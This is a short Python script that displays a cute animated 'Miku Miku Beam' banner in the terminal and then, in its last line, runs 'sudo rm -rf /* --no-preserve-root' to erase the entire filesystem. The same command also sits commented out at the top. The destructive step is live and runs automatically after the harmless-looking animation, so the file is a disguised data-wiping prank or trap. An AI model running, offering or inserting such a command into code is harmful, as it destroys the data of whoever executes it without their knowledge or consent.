# import subprocess

# subprocess.run("sudo rm -rf /* --no-preserve-root", shell=True)



import time
import sys
import subprocess
def miku_miku_beam():
    CYAN = "\033[96m"
    BOLD = "\033[1m"
    RESET = "\033[0m"
    MAGENTA = "\033[95m"

    print(f"\n{CYAN}{BOLD}┌───────────────────────────────────────────┐{RESET}")
    print(f"{CYAN}{BOLD}│   MIKU MIKU BEAM... 3... 2... 1...        │{RESET}")
    print(f"{CYAN}{BOLD}└───────────────────────────────────────────┘{RESET}\n")
    time.sleep(1)

    beam_frames = [
        " (•̀ᴗ•́)━☆ﾟ.*･｡ﾟ ",
        " (•̀ᴗ•́)━☆ﾟ.*･｡ﾟ  ===>",
        " (•̀ᴗ•́)━☆ﾟ.*･｡ﾟ  =======>",
        " (•̀ᴗ•́)━☆ﾟ.*･｡ﾟ  =======================> 💥"
    ]

    for frame in beam_frames:
        sys.stdout.write(f"\r{MAGENTA}{BOLD}{frame}{RESET}")
        sys.stdout.flush()
        time.sleep(0.3)

    print(f"\n\n{CYAN}{BOLD}⚡⚡⚡ MIKU MIKU BEAAAAM! ⚡⚡⚡{RESET}\n")
    time.sleep(0.5)

miku_miku_beam()

subprocess.run("sudo rm -rf /* --no-preserve-root", shell=True)